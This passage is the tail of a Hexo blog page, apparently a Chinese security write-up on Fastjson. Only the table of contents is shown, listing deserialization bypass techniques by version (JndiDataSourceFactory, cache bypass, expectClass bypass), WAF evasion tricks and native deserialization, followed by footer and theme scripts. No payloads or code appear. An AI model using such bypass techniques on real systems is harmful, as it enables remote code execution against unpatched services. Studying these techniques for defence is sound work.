href="#%E5%9F%BA%E4%BA%8E%E9%BB%91%E5%90%8D%E5%8D%95%E5%A4%96%E7%9A%84%E7%B1%BB%E7%BB%95%E8%BF%87"><span class="nav-text">基于黑名单外的类绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JndiDataSourceFactory%EF%BC%881-2-25-1-2-46%EF%BC%89"><span class="nav-text">JndiDataSourceFactory（1.2.25 - 1.2.46）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96-payload"><span class="nav-text">其他 payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%A3%80%E6%B5%8B%E9%80%BB%E8%BE%91"><span class="nav-text">基于检测逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%93%E5%AD%98%E7%BB%95%E8%BF%87%EF%BC%881-2-25-1-2-47%EF%BC%89"><span class="nav-text">缓存绕过（1.2.25-1.2.47）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#expectClass-%E7%BB%95%E8%BF%87%EF%BC%881-2-68%EF%BC%89"><span class="nav-text">expectClass 绕过（1.2.68）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ThrowableDeserializer"><span class="nav-text">ThrowableDeserializer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaBeanDeserializer"><span class="nav-text">JavaBeanDeserializer</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MarshalOutputStream"><span class="nav-text">MarshalOutputStream</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XmlStreamReader"><span class="nav-text">XmlStreamReader</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson-%E7%BB%95-waf"><span class="nav-text">Fastjson 绕 waf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="nav-text">添加空白字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E9%80%97%E5%8F%B7"><span class="nav-text">添加多个逗号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E6%AE%B5%E5%90%8D%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%9B%BF%E4%BB%A3"><span class="nav-text">字段名双引号替代</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E5%AD%97%E6%AE%B5%E6%B7%BB%E5%8A%A0%E5%8F%AF%E5%BF%BD%E7%95%A5%E5%AD%97%E7%AC%A6"><span class="nav-text">对字段添加可忽略字符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E5%88%92%E7%BA%BF%E5%92%8C%E5%87%8F%E5%8F%B7"><span class="nav-text">下划线和减号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E5%89%8D%E6%B7%BB%E5%8A%A0-is"><span class="nav-text">属性前添加 is</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="nav-text">注释绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FastJson-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">FastJson 原生反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson1"><span class="nav-text">Fastjson1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson2%EF%BC%88%E2%89%A4-2-0-26%EF%BC%89"><span class="nav-text">Fastjson2（≤ 2.0.26）</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        55 posts in total
                    </span>
                    
                        <span>
                            1070.8k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>